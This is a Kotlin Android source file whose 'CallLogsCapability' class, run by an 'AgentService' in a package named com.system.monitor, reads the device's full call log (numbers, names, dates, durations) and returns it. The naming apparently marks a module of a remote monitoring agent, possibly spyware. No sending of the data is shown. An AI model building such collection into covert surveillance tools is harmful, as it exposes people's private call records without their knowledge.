package com.system.monitor.capabilities

import android.content.ContentResolver
import android.database.Cursor
import android.provider.CallLog
import com.google.gson.Gson
import com.system.monitor.AgentService

class CallLogsCapability(private val service: AgentService) : AgentService.Capability {

    private val gson = Gson()

    override fun execute(args: String?): Any {
        val resolver: ContentResolver = service.contentResolver
        val cursor = resolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.TYPE, CallLog.Calls.CACHED_NAME),
            null, null, CallLog.Calls.DATE + " DESC"
        ) ?: return mapOf("error" to "no call logs")

        val calls = mutableListOf<Map<String, Any>>()
        while (cursor.moveToNext()) {
            calls.add(mapOf(
                "id" to cursor.getLong(0),
                "number" to cursor.getString(1),
                "date" to cursor.getLong(2),
                "duration" to cursor.getInt(3),
                "type" to cursor.getInt(4),
                "name" to cursor.getString(5)
            ))
        }
        cursor.close()
        return mapOf("calls" to calls)
    }

    override fun cleanup() {}
}